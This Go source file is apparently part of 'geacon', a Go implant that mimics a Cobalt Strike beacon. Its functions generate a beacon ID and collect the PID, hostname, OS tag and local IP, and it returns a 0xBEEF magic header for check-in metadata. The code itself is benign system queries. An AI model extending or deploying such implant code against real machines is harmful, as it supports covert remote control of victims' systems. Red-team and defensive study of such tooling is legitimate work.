package sysinfo

import (
	"encoding/binary"
	"geacon/cmd/crypt"
	"net"
	"os"
	"runtime"
)

func GeaconID() int {
	return crypt.RandomInt(10000, 99999)
}

func GetPID() int {
	return os.Getpid()
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	return sHostName
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}


